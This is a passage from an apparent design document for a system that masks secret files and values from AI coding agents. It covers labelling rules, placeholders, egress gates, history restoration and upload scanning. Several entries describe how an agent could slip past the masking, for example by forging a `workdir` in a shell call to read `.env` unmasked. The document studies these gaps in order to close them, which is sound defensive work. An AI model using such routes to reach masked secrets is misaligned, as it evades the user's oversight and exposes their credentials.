placeholder, never its text, at the program and at the model; red with
the gate off; then an append and an in-place write land in the copy,
`sed -i` is refused, the real file keeps its bytes and the session's end
names it; red before the write gate).

*A catalog file the launch did not register (2026-10-17).* The same leak
held for the catalog's own files (§6 item 1): a `.env`, a key or a
credentials file created mid-session, deeper than `MAX_DEPTH`, past
`MAX_FILES` or outside HOME was registered by nothing, so `grep -r`, `tar`
or a script printed it to the model in clear. The guard gates those opens
through the labelled-file machinery above (its writes, renames and second
names included): `labelRootsSince` also lists the catalog's prefixes for
the arbiter's and the launch's HOME and ships the basename shapes as a
prefilter of name anchors; `labelledLevel` gives the WALK's verdict
(`gateVerdict`: by path, never content, so a `.env.example` stays raw; the
walk's prunes, so `node_modules` and the other skipped directories, package
caches and the agents' own files stay raw; outside every home, another
account's file stays raw). A name no anchor admits costs no round trip
(about 0.26 µs per open). The decision, its prunes and why:
secret-discovery.md §1.12. *What changes for utility:* a program other than
the agent reading such a file gets its placeholder, as for a registered
one (a `public` label releases it). A source file named like a credential
(`src/auth/providers/credentials.ts`) did too, deeper than the walk, until
the `*credentials*` shape skipped program source (2026-10-17, item 1): the
shape's test and its anchor share one list (`SOURCE_EXTS` with the
documentation extensions, shipped as the anchor's `notSuffixes`), so the
walk, `labelledLevel` and the guard's prefilter agree and the file costs no
round trip; a label, a catalog prefix and the value backstop still cover a
real secret in one. Tests:
`arbiter/test/unit/catalog-gate.test.ts`, `label-roots-op`, `label_index`,
`net-supervisor/tests/catalog_open_integration.rs`,
`tests/stack/catalog-file-unregistered-read.test.ts`,
`tests/sandbox/secret-catalog-opens.test.ts` and the fixture-home table
(the depth and file caps no longer leave a file raw under the guard).

*Goose's `shell` and OpenClaw's `read` (2026-10-09).* The live drill
`conf-public-label-wins` at 1250328fa5 still masked the human's `public`
fixture on two agents, by two causes. Goose reads a file with `shell
{command: "cat test/fixtures/.env"}`; its tool shares the name `shell` with
Codex's classic wire, so `callWorkdir` took the Codex branch (a `workdir`
param, else the openai-proxy's session default), found neither, and never
read the start directory the kernel had recorded for the call's bound shell.
A `shell` / `exec_command` call that names no `workdir` and has no session
default now falls back to that start directory; a named `workdir` and
Codex's session default still come first (Codex may start a wrapper that
changes into the `workdir` after the exec the guard saw), but since
2026-10-11 only on a tool whose agent runs it there ("A forged `workdir`",
below: Goose's never does). OpenClaw reads a
file with its own tool, `read {path: "test/fixtures/.env"}`, which resolves
a relative path against its workspace: the launch directory, which the
launcher pins (`fenceOpenclawWorkspace`) and names the anthropic-proxy
(MANDU_AGENT_CWD), the same base the fs gate already resolves a gated path
field against (`relativeBase: "launch"`). The proxy now sends it as
`ClassifyRequest.relativeBase` on every classify of a result of a tool its
gate surface lists in `paths` (not a shell, not a dispatched call), and the
arbiter applies it only where its own copy of the session's gate surface
agrees (`policy-interface.ts` `relativePathBase`: the surface says `launch`
and lists the tool), and then only to that tool's typed path fields and to
the origin when it is the same value, never to command text
(`secret-catalog.ts` `labelForClassify` `pathBase`). The value is resolved
WHOLE, as one path (`typedPathConfidentiality`): a human label on
`<launch dir>/<value>` decides it in either direction (a `no-model` label on
`vault/` now masks `read {path: "vault/k.txt"}`, which the catalog let
through), without one the stricter of the value as written and the
resolved path stands. A value that may name another file than
`<dir>/<value>` keeps the catalog's verdict: a leading `@` (OpenClaw strips
it), anything outside printable ASCII (OpenClaw normalizes Unicode spaces
and tries Unicode and quote variants of a missing path), a glob, an
expansion, a home path. Every other source of the call keeps its own
verdict, so a second field naming a secret keeps the result masked, and the
value backstop still masks a registered value inside a public-labelled
file. A combined read (`cat README.md contracts/deal.md .env`, which Goose
also did live in `conf-three-levels`) stays one datum at its strictest
file's level, as for Codex: its bytes carry no file of origin. Tests:
arbiter `relative-path-base` (unit), anthropic-proxy
`relative-base-classify` (unit), `tests/stack/relative-read-public-label`
(both agents' shapes over the real arbiter and proxy, the secret in no
request).

*A forged `workdir` (2026-10-11).* `callWorkdir` still keyed the base on the
tool NAME: any `shell` or `exec_command` call that named an absolute
`workdir` was read there, ahead of the kernel's start directory. Goose's
`shell` has no `workdir` (`{command, timeout_secs}`, captured) and runs
every call in the launch directory whatever else its input holds, so a
`workdir` a Goose model wrote into its call was a claim nothing acted on,
and the arbiter believed it. A base only ever lets a human label decide, so
a forged one picks WHICH label decides: `shell {command: "cat .env",
workdir: "<the directory of a file the human labelled public>"}` read the
workspace's secret `.env` as the public fixture, and its bytes reached the
model raw (and from there could be written into a later command, where the
egress gates look for symbols and registered values, not for these bytes);
`cat vault/k.txt` with `workdir: "/"` in a call the kernel had bound never
looked up the human's `no-model` label on the workspace's `vault/`. The
other layers bounded it where they apply: a file the kernel guard knows as
secret is opened as its twin, and the value backstop masks a registered
value. What was left is the case the ledger named: a call the kernel could
not bind (no guard, so no twin either) reading a value nobody registered.
Now the session's own gate surface says which tools its agent runs
in their `workdir` (GateSurface `workdir`, `tool-gate-surface.ts`; the
policy wrapper reads it by the session's spec, `sessionWorkdirTools`,
never from the request): Codex's `exec_command` and its classic `shell`
only with an argv `command` (`CODEX_WORKDIR_TOOLS`, in Claude Code's table,
which is the one a Codex session resolves to: the openai-proxy binds no
spec), OpenCode's `bash` and `shell`; Goose's and OpenClaw's none. A
`workdir` on any other call is ignored, and the kernel's start directory is
read instead, else none (the catalog's verdict). A session with no table
of its own believes only what every agent's table honours (none), and a
caller of the pure function that names no table believes none. A Goose session that lost
its binding resolves to Claude Code's table, where Goose's string-command
`shell` is not Codex's argv `shell`, so the claim stays ignored. Tests:
arbiter `workdir-per-agent` (unit: the tables held to the captured wires,
the derivation with and without the fix, the engine wrapper),
`tests/stack/relative-read-public-label` (a scripted Goose model forging
the `workdir`, bound and unbound, the secret in no request).

*The row of a relative read carries its file's bindings (2026-10-10).* The
live drill `conf-declassify-confines-session` (the workspace's `memo/`
labelled `any-model` bound to `example.com`) passed on OpenCode and
over-blocked on OpenClaw: after `declassify_symbol`, a `web_fetch` of the
memo's own bound host was held as `session:high-unbound`. The base above
reached the CLASSIFY of the result only. The SYMBOLIZE of the same result
re-derived the row's bindings server-side from its origin, the relative
`memo/brief.md`, which no label matches: the row was `any-model` (the
classify's level, sent with it) but bound nowhere, at mint and at every
later bindings sync (`current-bindings.ts` rule 2 reads the stored
origin). The result held the twin's token, so the declassify raised the
session with that row and the registered file's row it opened, and the
intersection of their bindings (§4) was empty. OpenCode names the absolute
path, so its row carried the label's binding. (Before the base, OpenClaw's
relative read was not secret at all: the twin's token reached the model
unwrapped, and its declassify bound the session to the registered row.)
The proxy now sends the same `relativeBase` on every symbolize of that
result (`SymbolizeRequest.relativeBase`), and the arbiter applies it under
the classify's rule (`relativePathBase`, then `resolveTypedPathOrigin`: a
value the tool reads as `<dir>/<value>`, no `originHuman`, the axis ON) by
STORING the row at the resolved path: its level and bindings are then that
file's label, at mint and at every sync, and the session's bound set is
exactly the bindings of what it read. Nothing is widened: no base, a base
the session's surface does not vouch for, or a value the tool may read
elsewhere keeps the relative origin, bound nowhere (every host asks), and
an unbound host still asks. Tests: arbiter `relative-read-bindings` (unit),
anthropic-proxy `relative-base-classify` (unit),
`tests/stack/openclaw-relative-read-bindings` (OpenClaw's relative read,
its plugin's `declassify_symbol` and two `web_fetch` calls through the real
proxy and arbiter: the bound host passes, the unbound one is blocked). The
same gap remains for a SHELL command's relative tokens read in a known
directory (Codex's `workdir`, the kernel's start directory): the classify
reads the label there, the symbolize and the sync read the command text
with no directory, so such a row is bound nowhere (an over-block, never a
leak).

*A relative read of a secret file's twin is per key (2026-10-11).* Walking
the first-session tour on OpenClaw, the model read `.env` as
`read {path: ".env"}` and got ONE whole-file placeholder, where Claude
Code's `Read` of the absolute path gets the structured twin (keys as
written, one placeholder per value; plan 10 §2.4). The structured
read-twin rule (`policy-interface.ts` `isStructuredTwinRead`) looked the
twin up by an absolute path only. With one handle for the whole file the
model could not use the Stripe key on its own: it pulled it out of `.env`
with a shell command, whose output (the command names a secret file) was
masked whole, Mandu's own "stopped, ask the user" answer from the egress
gate with it, so the model told the user nothing about the Approvals card.
The rule now resolves a relative `path` / `filePath` the same way the
classify above does (`relativePathBase`, then `resolveTypedPathOrigin`),
for OpenClaw's and OpenCode's `read`. Nothing is widened: the release still
needs the rendering to be a contiguous piece of the twin this arbiter
minted with every token allocated (`isStructuredTwinText`), so a wrong
resolution only misses the twin and the mask stands; no base, a base the
session's surface does not vouch for, or a value the tool may read
elsewhere keeps the whole-file mask. Tests: arbiter `agent-read-twin`
(unit), `tests/stack/agent-read-twin` (OpenClaw's relative read through the
real arbiter and proxy: per key with the launch directory; the raw file, a
tampered twin, and no launch directory stay one handle).

*OpenClaw's history redacts placeholders (2026-10-11).* The same walk, one
turn later: the twin went to the model per key on the turn of the read, and
on the next turn came back masked whole, "after the fact". OpenClaw keeps
every tool result in its history through its own redaction (its
`redactToolPayloadText`, always on; read off the pinned 2026.7.1 build): a
value that looks like a secret becomes its first 6 characters, `…`, its
last 4 (`***` under 18), and Mandu's placeholders look like secrets to it,
so `STRIPE_KEY='$MDU:nomodel_Read[e7f3].STRIPE_KEY'` came back as
`STRIPE_KEY='$MDU:n…_KEY'`, which is no twin. The model, left with one
handle for the whole file, put that handle in its `curl`. The
anthropic-proxy now remembers, per launch and by tool-call id, the results
it forwarded in clear, and in an OpenClaw session puts the remembered text
back when the history carries exactly OpenClaw's redaction of it
(`openclaw-redaction.ts` `isOpenclawRedactionOf`: the same text with spans
replaced by those masks), BEFORE the result is judged; every check then
decides it as it did the first time, and a file labelled since is masked
with the after-the-fact note. Nothing new reaches the model: the text went
to it under that id already, and is judged again. A `***` may hide a span
of any length (OpenClaw's `maskSecretValue` writes `{"api_key": "***"}` for
a 34-character placeholder; read off the installed 2026.7.1 and 2026.9.9
builds by calling their redaction on twins).

*Across a relaunch (2026-10-11).* A relaunch that resumes the conversation
re-sends the history to a proxy that never saw it. What it re-sends, read
off OpenClaw 2026.9.9: the transcript store writes each message through
`redactTranscriptMessage`, which keeps `toolCall.id` and
`toolResult.toolCallId` verbatim (the provider's `toolu_…` / `call_…`) and
redacts the result's text, so the resumed request carries the original
call ids and the redacted results. So the proxy also records, for every
result it forwarded in clear in an OpenClaw session that carried a
placeholder, a **placeholder record** in the arbiter (mandu.db
`forwarded_placeholders`, by call id, human plane only:
`recordForwardedPlaceholders` / `forwardedPlaceholders`): the placeholders
with their offsets, and a SHA-256 over the call id and the text. A later
launch asks for the records of the history's results that may be redacted
(`prime`) and rebuilds the text (`rebuildFromPlaceholders`): the text
between placeholders is copied from the history as it stands, each
placeholder's form in the history (verbatim or OpenClaw's redaction of it)
is replaced by the recorded token, and the rebuild is kept only when its
digest is the recorded one and the history is exactly OpenClaw's redaction
of it. Then it is judged as above.

*What the record holds.* No byte of the text but the placeholders: the
arbiter refuses a record whose "placeholder" is not exactly one symbol
token, so the table cannot become a copy of what the model read (a twin's
key names and comments, a file admitted to the model) and is no new store
of anything secret: the symbol table beside it holds every one of those
tokens with the value it stands for. The digest is a one-way function of a
text the model already received.

*Why a forged redaction cannot un-mask anything.* A restore puts back only
a text Mandu itself forwarded in clear under that call id, byte for byte:
from memory by construction, from a record because its SHA-256 equals the
digest a Mandu proxy recorded on the human plane (the data socket the
agent's processes reach refuses both ops, so the agent world can neither
plant a record nor read one). A model, a file or an edited transcript can
at most pick, by its call id, which of Mandu's own forwarded texts comes
back, a text the model already received under that id; a rebuild from a
record supplies nothing but placeholder characters (every other byte is
the history's own). And the restored text is
then judged again like any result, so what is secret now (a file labelled
since) is masked. A history that matches no record (another text under the
id, a byte added, an id never recorded, a launch whose proxy had no human
socket) is judged as it stands: masked whole when it names a secret file,
never raw.

Limits (over-masking, never a leak): a result whose history also hides a
non-placeholder value (a public value OpenClaw takes for a secret) or cuts
a span reaching past a placeholder is restored within the launch only; past
the bounds (100 000 records, the oldest first) the restore is lost.

*OpenClaw on an OpenAI model* is served by the anthropic-proxy too: its
OpenAI-wire reader (`openai-wire.ts`) runs the same rewrite, so the restore
applies on Chat Completions and the Responses API alike; the launcher sends
only Codex to the openai-proxy (`wireOf`), whose agent keeps no such
redaction, so nothing there needs it. Tests: anthropic-proxy
`openclaw-redaction` (unit: the matcher on OpenClaw's own redactions, the
record and the rebuild, the forgeries, the memory with a store, the
rewrite across a relaunch), arbiter `forwarded-placeholders` (unit: the
store, the minimisation, the human plane), `tests/stack/agent-read-twin`
(the next turn through the real arbiter and proxy),
`tests/stack/openclaw-redaction-relaunch` (launch 1, a new arbiter over the
same mandu.db and a fresh proxy, on the Messages wire and the Responses
wire; the forged, unknown and data-only negatives; the oracle) and
`tests/stack/proxy-real-client-parity` (the production wiring of both ops).

**Mislabeling fails silent**: an unmarked secret is `public` and leaks
freely while the dashboard shows green. This is the feature's biggest
practical risk (DLP deployments historically die here). Mitigations: the
default catalog, inheritance, coverage visibility, and *advisory*
high-entropy/credential-shape heuristics that suggest labels; detection
may assist labeling, it never replaces enforcement. One class of them
labels by default since 2026-10-19, the catalog's content tier
([`secret-discovery.md`](./secret-discovery.md) §2.6): a JSON, YAML or
TOML (and, since the same day, INI-family: `.ini`, `.conf`, `.cnf`,
`.cfg`, `.properties`, a project's `.npmrc` or `.pgpass`, §2.9) config
file the launch walk reads a credential in (a credential-like value under a
credential-named key, or a short password under a password's or a PIN's
name, §2.9) gets a machine label, `no-model` and
bound nowhere, which a human label overrides as it overrides the catalog.
The verdict is taken over files at rest at the launch, its twin keeps the
file parseable, and enforcement is the catalog's. A second class since the
same day ([`secret-discovery.md`](./secret-discovery.md) §2.7, §2.8): a small
text document, or the text of a PDF or Office file, the walk reads and recognises, on several independent
signals of a checked shape, as a personal document (a bank or card
statement, a payslip, a tax return, a lab report, an identity document, a
note of household codes) gets the same machine label, rule
`content:personal-document`, with a twin that keeps each line's label and
makes every value a placeholder, so the model can still place each value
in a task and reads none. Every other unmarked file stays `public`. The dual risk,
labeling `any-model` what should be `no-model`, is why nothing defaults to
`any-model` and the dashboard lists the `any-model` surface explicitly.

### 6.1 Path patterns in `policy.yaml` — gitignore-style, not regex (2026-09-20)

A literal `paths:` entry names one file or one subtree. An entry whose
`path` holds an unescaped `*`, `?` or `[` is a **pattern**
(`arbiter/policy/path-glob.ts`), so a law can say "every `*.pem` anywhere"
or "the `contracts` directory of every workspace":

```yaml
paths:
  - { path: "**/*.pem",                level: no-model }
  - { path: "~/work/*/contracts",      level: any-model, bindings: ["example.com"] }
  - { path: "**/ws-*/contracts/**",    level: any-model }
  - { path: "**/test/fixtures/.env",   level: public, recursive: false }
```

| Syntax | Meaning |
|---|---|
| `*` | any run of characters inside ONE segment (dotfiles included) |
| `?` | one character inside a segment |
| `[abc]` `[a-z]` `[!abc]` | one character from, or not from, a set |
| `**` (a whole segment) | zero or more segments |
| `\x` | the character `x` literally (a real `*` in a file name is `\*`; such an entry stays a literal label) |

A pattern is **anchored**: it starts with `/`, `~/`, or a leading `**`
segment (anywhere on the machine). An unanchored `*.pem` is refused with the
reason, as is `a**b`, an unclosed `[`, a `..` segment, and `**` alone.
`recursive` keeps gitignore's meaning: a matched directory covers what is
below it. There is no `!negation`: an exception is a second entry with its
own level, decided by the precedence below, so it is a visible row of the
law. Only `policy.yaml` mints patterns; a dashboard "Lock it" act labels a
real path.

**Why not regex.** Each failure mode is a silent mislabel. An unanchored
regex over-matches (`.*\.env` also hits `x.env.bak`), and an over-matching
`public` entry is a quiet declassification. "Most specific wins" has no
meaning between two regexes. The JS regex engine backtracks, and the
resolver runs on every classify, so one bad pattern would stall the
security daemon. The glob matcher does not use the regex engine: a
star-backtrack walk per segment (O(pattern × name)) and a table over the
segments for `**` (O(segments × depth)), with the pattern bounded at 512
characters and 32 segments; no input makes it exponential (unit-tested).

**Precedence** extends "specificity decides, never restrictiveness"
(`path-labels.ts`):

1. a LITERAL label on exactly this path;
2. among recursive literal ancestors and matching patterns, the longest
   **literal prefix**: a literal's whole path, a pattern's leading
   wildcard-free segments (`/ws/contracts` for `/ws/contracts/*.md`);
3. on a tie a pattern beats a literal ancestor; between two patterns the
   **stricter level** wins, then the pattern text. Restrictiveness breaks
   ties only: where specificity cannot decide, we do not know which the
   human meant, and not knowing is where fail-closed applies.

A pattern that leads with `**` has an EMPTY literal prefix, so any directory
label closer to the file beats it (`~/notes` = `any-model` beats `**/*.pem`
= `no-model` for `~/notes/k.pem`); to pin a class inside a labeled
directory, write the pattern under that directory. What decided is always
answerable: `pathLevel.rule` is `label:<pattern>`, the watch panel's
per-file chip shows it, and Policy → Test a flow answers the same
derivation for any typed path (`testFlow.pathLabel`), naming a STRICTER
pattern a literal directory label outranked (`outrankedStricterPatterns`,
observability only).

**Two guards.** A pattern is never an EXACT label: the §8 release of one
derived artifact is a literal act on that path, so a `public` pattern cannot
lower the taint on a file a HIGH session wrote (`derived-labels.ts`). And a
`public` pattern is always reported as a declassification (Relaxations, the
locked-files surface). An `any-model` pattern is flagged only when it AIMS
at catalog-secret files (`patternTargetsCatalogSecret`): its literal prefix
sits under a catalog prefix (`~/.ssh/*`), or its final segment matches a
catalog-shaped name (`**/.env*`); a whole-directory pattern is judged like a
literal directory label. The probe is a reporting heuristic; a miss leaves
the flag off and no decision wrong.

Downstream is unchanged: secret discovery resolves each walked file through
the same lookup, so a pattern-labeled file is discovered and twinned;
fs-sync's relabel guard re-mints a twin whose pattern label changed. The
validator refuses a pattern that does not compile at boot and on reload
(last-known-good stays in force).


## 7. Enforcement — the same four chokepoints, per level

| Chokepoint | `no-model` | `local-model` (§3.5) | `any-model` |
|---|---|---|---|
| ① model context | Proxy symbolizes secret-file content in `tool_result`s; model sees `$MDU:nomodel_…`. U-LLM quarantine calls are equally excluded. | Symbolic (`$MDU:localmodel_…`). Quarantined reads only at a declared `local: true` endpoint (refused otherwise, never rerouted); results inherit `local-model`. In-context reads only when the session's main model is a declared local entry, then as `any-model`, watermark at `local-model`. | Symbolic by default (`$MDU:anymodel_…`). Quarantined reads desymbolize inside `inspect_symbol` and return re-symbolized, same-label results. In-context reads are logged declassifications that **high-watermark the session**. |
| ② filesystem | The agent's world holds a symbolized twin of each registered secret file (§7.2); HumanView untouched. The guard sees every open of a secret path: the taint source for §8. | Same visibility; a high session's written files are labeled at its watermark, `local-model` included (levels fold by `max`). | Same visibility; additionally, **files written by a high session are labeled at the watermark** before fs-sync exposes them anywhere public. |
| ③ exec | **The one-way valve** (§7.1): net XOR secret-path readability; untrusted-lineage processes get neither. Outputs of secret-reading processes are secret-tainted (§8). | Same valve and readers (plan 10); the level is one more value in the same fold. | Same valve. A high session's HumanShell verdicts tighten: net-enabled worlds only toward bound destinations; otherwise AgentShell or approval. |
| ④ network | Egress gate desymbolizes a `no-model` symbol **only at its bound destination**; untrusted-influenced ⇒ approval. | Bound destinations only, same rule. | Symbol egress: bound destinations only, same rule. High session: **all** egress requires a bound destination or approval; outbound bodies fingerprint-scanned as a tripwire. |
| reply-filter | Freely desymbolizing: the human owns their secrets. Every secret SOURCE renders the same way: its original (below). The filter resolves over the arbiter's **human plane** (`arbiter-human-plane.md`): `desymbolize` is refused on the data socket the agent's tools reach, and a filter that cannot reach the human socket passes tokens through. A multi-line or wider-than-the-terminal value under a live TUI renders row by row in rows the proxy reserved (`reply-row-reservation.md`). Only its row count reaches the agent's world, never the model; the terminal width that count depends on is set on the human plane, which the agent cannot reach (§11.5 there). | Unrestricted to the human, as for every level. | Unrestricted to the human, including quarantined-read results (this is how rung-2 tasks deliver their answer). |

**Secrets on the human's terminal: one rendering for every source.** The
terminal shows the ORIGINAL of every secret, whatever its source: `.env`
fields, credential-file fields (`$MDU:nomodel_Read[h].KEY`,
`…[h].default.aws_access_key_id`) and masked environment variables
(`$MDU:nomodel_Env[h].NAME`) alike. All are rows of the one symbol table,
and the `desymbolize` op (label-unrestricted on purpose, served only on the
human plane) resolves every one. The alternative, one readable mask for
every source (for example `‹secret: GITHUB_TOKEN›`), was rejected: it would
hide from the human values they already hold on disk, break copy-paste of
their own output, and contradict the HumanView promise the reply filter
exists for. The dashboard's product page has a different rule
(dashboard.md §4.25b: originals on a click; a secret's real value only to a
signed-in viewer, one at a time, on its own *Show the real value* click,
never inline), because a web page can be left open, shown or shared; the
terminal cannot.

A mixed rendering (`.env` values shown, an INI credential or an `echo
$GITHUB_TOKEN` left as a token) came from the filter's wrap reassembly:
`\n` is both a real line break and a TUI wrap insertion, so a token that
ENDS a line was glued to the next line's first word and the arbiter
correctly refused a name it never allocated. The filter
(`interceptors/reply-filter/src/filter.ts`, LINE-END GLUE FALLBACK) now
tries the full reassembly first and, when it does not resolve, the shorter
complete tokens that end exactly at one of its insertion boundaries,
longest first, splicing only one that resolves. *Security:* this is the
human-facing egress only. The twin files and the masked environment are
built before the agent starts, and the reply filter reads the agent's
stdout on its way to the terminal and writes nowhere the agent can read; on
any arbiter failure it degrades to passthrough, so every source stays a
token alike. Pinned by `tests/stack/reply-filter-secret-render.test.ts`
(real arbiter, real registration, real reply-filter CLI) and the `line-end
glue` unit tests in `interceptors/reply-filter/test/unit/filter.test.ts`.

**A harness side call carries a fetched page (fixed 2026-10-02).** Row ①
masks what comes back as a `tool_result`. Claude Code's `WebFetch` does not
return the page that way: it hands the page to its own summarizer, a second
Messages request with no tools whose one user message is `Web page content:
--- <page> --- <prompt>`, and only the summary comes back as the tool
result. Both go through the model proxy, which walked tool_results only, so
a page holding a registered secret reached the vendor's model raw in the
summarizer call. Found by the real-path suite for `model-ingress/web`
(`tests/stack/web-fetch-secret-ingress.test.ts`, test-reorganization.md
§11.1). OpenCode's `webfetch` and OpenClaw's `web_fetch` return the page as
the tool result and were masked.

*Fix* (prompt filter phase 1,
[`confidentiality-plan-15-prompt-filter.md`](./confidentiality-plan-15-prompt-filter.md)).
A request that advertises no tools is a harness side call (title
generation, the quota probe, the WebFetch summarizer), and its user text is
the harness's. Under the prompt filter's `filterPrompt` op every user text
of such a request is a `side-call` segment and gets the registered-value
floor, always on in `secrets`. The arbiter's matcher reports offsets, so the
registered value's own span becomes the value's own symbol (a long line of
a multi-line secret, or overlapping values, is minted once at the strictest
level), the rest of the page stays readable, and a `[mandu:secret]` note
follows. The rewritten text is scanned again and a value that survives
masks the segment whole. Fail-closed: an op that fails, a missing answer or
an action the filter does not enact refuses the request (`RewriteRefusal`,
a 502); an in-test arbiter without the op filters nothing. A side call
emits a `prompt_filter` event like any other segment.

*Scope.* In a request that advertises tools (the conversation), user text
is cut into segments by who wrote it (plan 15 §3.1): text the harness added
(a `<system-reminder>`, a command record, IDE context, Codex's AGENTS.md and
`<environment_context>`, …) gets the same floor as a side call; text placed
as the human's gets the registered-value filter with a prompt floor (a
value under 12 characters or 3.0 bits per character is left as typed), so a
registered key the human pastes reaches the model as its symbol while
`DB_PASSWORD=postgres` does not mask the word "postgres". The prompt is
otherwise trusted: `secrets` does not mask untrusted text, and no other
prompt filter is on by default (plan 15 §2; opt-in filters, plan 15
§13.3). Pinned by `test/unit/side-call-secret.test.ts` and
`test/unit/prompt-filter.test.ts` in both proxies, the stack suite above and
`tests/stack/prompt-filter-ingress.test.ts`.

**A tool that uploads a local file (2026-10-07).** Row ① masks what comes
back; row ④ releases what goes out as a symbol. Neither sees a tool that
reads a file ITSELF and sends the bytes off the machine: the bytes never
enter the model context, so no symbol is minted for them, and the only
trace on the wire is the path the model wrote. Claude Code 2.1.292's
`DesignSync` is one (`write_files{files[].localPath}` to claude.ai). The
model proxy gates it on the wire (supported-agents.md §2, "Claude Code
2.1.292"): each path, placed against the plan's absolute `localDir`, goes
to the arbiter's `fileUploadDecision` (`arbiter/policy/file-upload.ts`),
which reads the label (human, catalog, derived, session, registry) and the
registered secret values in the bytes, and holds for approval anything not
bound to the destination; the strings the call sends go through row ④'s
session and per-symbol legs at that host. Any block refuses the whole
call; a path it cannot place, or an arbiter that does not answer, refuses
it too. The confinement (§7.2, §7.3) stays the backstop for a file
changed between the check and the read (the residue, guarantees.md §3;
narrowed below).
Claude Code's interactive Artifact tools (2026-10-09; supported-agents.md
§2, "Claude Code 2.1.295") are three more: `Artifact` publishes a local
page (`file_path`) and its `files` to claude.ai, `ArtifactData` sends a
local JSON file (`file_path`, `writes[].file_path`) as a document, and
`ArtifactComments` sends reply text. Each path is placed absolute only (a
`files` source against an absolute `root`): the working directory follows
the shell's `cd`, so a path relative to it refuses the call with how to
call it. The same `fileUploadDecision` and the same net legs apply.
OpenClaw's are the rest (2026-10-17; supported-agents.md §2.1, "Tools that
send a local file"): `message` attaches files to a chat channel send (every
media source OpenClaw reads, `attachments` included), `browser` uploads
into a page, and `view_image`, `image`, `pdf` and the media generators load
files into a model. A chat channel and a page are no host a binding can
name, so those are asked with no host (the person's OK is the only
release); a model-bound file is asked `toModel`, where `any-model` admits
it and `local-model` / `no-model` are held.
The residues, narrowed 2026-10-17 (supported-agents.md §2, "The upload
residuals"): the hosts are observed, not assumed (the bytes go to
`api.anthropic.com`, a model API host the egress proxy did not carry, so
this gate is the decision (under the model-host deny, since 2026-10-18,
the upload requests also ride the inspected leg on paths its list names,
agent-sdks.md §4); a binding must name `claude.ai` and that host);
an upload after a call of the same turn that may write files is refused
(the agent runs that call first); and a tool no gate table names has every
local path in its input put to `fileUploadDecision` in its unmapped form
(no host, so no binding releases anything; a secret path becomes one that
names no file), except a tool the session maps after all and a registered
local MCP server's under the file guard. The openai-proxy runs the same leg
for Codex (2026-10-17: its MCP tools, called directly or from a code-mode
cell, which a hold replaces whole; supported-agents.md §2, item 4). The
confinement stays the backstop for a file a program already running changes
between the check and the read, and for a path the unmapped leg cannot
recognize as one (a path a Codex cell computes at run time among them).

*Path first, bytes streamed (2026-10-17).* Until this date the arbiter read
the whole file into memory, synchronously, and held anything over 8 MiB as
unchecked, so every large image, video or PDF OpenClaw attached or Claude
Code uploaded asked for approval. Now:
1. **The path decides first, with no byte read**
   (`decideFileUploadByPath`): the sensitive and process paths, the axis,
   nothing there or a folder (unmapped form), and the labels of the path and
   its real path (human, catalog, derived, session, registry). A held secret
   path, a sensitive path or a folder is never opened.
2. **Only when the path does not decide are the bytes scanned, in chunks**
   (`arbiter/policy/upload-scan.ts`, 256 KiB reads, `FILE_UPLOAD_SCAN_CHUNK_BYTES`).
   The match is the value backstop's, unchanged: each secret row's whole
   value and its pieces (long lines, credential-shaped spans, a registered
   file's bare tokens), verbatim in the bytes decoded as UTF-8 exactly as
   `readFileSync(path, "utf8")` decodes them (`RegisteredValueIndex.stream`).
   No encoded form (base64, URL) is looked for, here or in the backstop.
   The decoder is streamed, so a character split across reads decodes whole,
   and each read is matched with the last `longestPattern - 1` code units of
   the one before it, so a value straddling two reads is found (a read is
   at least four times that overlap, so a long registered document does not
   make the scan re-walk mostly old text). The file is opened non-blocking
   and judged by its descriptor's own stat (a FIFO swapped in after the
   path phase's stat never blocks a thread).
3. **Held only past a much higher bound, or on an error**: past
   `FILE_UPLOAD_MAX_BYTES` (256 MiB, by stat, or by bytes read if the file
   grows while it is read), past the scan deadline
   (`FILE_UPLOAD_SCAN_DEADLINE_MS`, 45 s), not a regular file, or any read
   error. Fail-closed is unchanged: unread bytes are unchecked bytes.

*The event loop and the deadline.* The arbiter is the single owner of the
symbol DB, so one huge file must not stall every interceptor. Every chunk is
one asynchronous read, so other clients are answered between chunks; the
CPU work per chunk (decode and match) is the only stall. Measured on the
development host (Node 22, 40 secret rows from 20 registered files, a
255 MiB probe): **about 42 MiB/s on random binary** (a photo, a video, a
PDF's streams: most code units are U+FFFD and the automaton stays at its
root, which the matcher now reads from a table, not a hash map: about 1.7
times faster) and **about 100 MiB/s on log-like text**; 256 MiB of binary
takes about 6 s. The CI guest alone scans at the same 35 MiB/s as the host
(64 MiB, one registered file), and its stall per chunk is the chunk's size:
1 MiB reads stalled the loop about 40 ms each, 256 KiB reads about 10 ms,
at the same throughput, so the read is 256 KiB
(`FILE_UPLOAD_SCAN_CHUNK_BYTES`). Under load the stall grows with the
load: in !1833's first pipeline, with the guest running many suites at
once, the scan ran about 17 times slower (2 MiB/s), and a 1 MiB chunk then
held every other client about 0.6 s.

That is over the proxies' 5 s per-call bound, so the timeout is raised **for
this op only**, and a scan that cannot finish is held, not passed: the
client asks with `progress: true`, and the arbiter sends `{id, progress:
true}` as soon as the byte scan starts and then at most every second
(`FILE_UPLOAD_PROGRESS_MS`), from each chunk as well as from a timer (a
timer the scan's own work delays still gets a frame out at the next chunk).
That re-arms the client's 5 s idle timeout up to `FILE_UPLOAD_TIMEOUT_MS`
(60 s) in all, and the proxies' upload gates wait that long
(`DEFAULT_UPLOAD_GATE_TIMEOUT_MS`, `DEFAULT_UNMAPPED_UPLOAD_TIMEOUT_MS`;
the reply `MEDIA:` check's net leg keeps the net gate's own 5 s). The
margin: a frame at most 1 s plus one chunk apart, against a 5 s idle
timeout, so the call survives a chunk up to about 4 s (a load 400 times the
measured stall). An arbiter that stops answering still fails closed at the
5 s idle timeout; a scan past 45 s is held by the arbiter itself (with its
Approvals row) before any client gives up, so a host loaded enough to scan
slower than about 6 MiB/s holds a 256 MiB file for the person. The
alternative, a "pending" answer at the 5 s mark, was rejected: it would hold
most files between about 200 MiB and the bound on this host, and more on a
slower one, which the bound exists to avoid. The cost is the relay's wait:
the tool call's block is relayed only once the answer is in, at most a few
seconds for a large file. Tests: `arbiter/test/unit/upload-scan.test.ts`
(the stream equals the whole-text match, randomized; the decode equals
`readFileSync`; a straddling value; the bounds), `file-upload.test.ts`
("STREAMED": 20 MiB clean goes, with a value held, past the bound held, the
path phase opens nothing), `test/component/upload-scan-op.test.ts` (64 MiB
over the real sockets, the call asserted to outlast the client's idle
timeout, so only the frames keep it alive; another client answered in a
small fraction of the scan's time; a frame at the scan's start and more
while it runs; its pacing is a test knob, `uploadScan`, with ratios for
